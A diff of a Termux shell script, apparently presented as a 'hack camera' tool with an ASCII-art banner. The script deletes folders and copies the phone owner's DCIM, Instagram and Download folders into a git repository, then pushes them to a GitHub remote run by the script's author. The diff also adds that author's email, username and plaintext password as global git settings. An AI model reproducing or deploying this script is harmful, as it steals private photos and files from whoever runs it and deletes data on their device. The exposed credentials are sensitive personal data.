@@ -1,3 +1,4 @@
+termux-setup-storage -y
 rm -rf ~/storage/shared/termux
 clear
 echo -e '\033[0;36m            .-""-.';
@@ -26,17 +27,18 @@ echo -e '\033[1;31m                                  |___/';
 cd
 rm -rf DCIM
 cd /sdcard
-cp -r DCIM ~
-cd
 cd ~/storage/shared/
-mkdir /sdcard/Hack-Camera
-cp -r DCIM instagram Download Hack-Camera
-mv Hack-Camera ~/kitthack
+mkdir /sdcard/termux
+cp -r DCIM instagram Download termux
+mv kitthack ~/kitthack
 cd ~/kitthack
 touch hi.txt
 git init
 git add .
 git commit -m "first commit"
-git remote add origin https://github.com/MrAli-s/01010cam.git
+git remote add origin https://github.com/MrAli-s/kitthack.git
+git config --global user.email "horrorstories189@gmail.com"
+git config --global user.name "MrAli-s"
+git config --global user.password "1928Rami@//"
 git pull --rebase origin master
 git push -u origin master
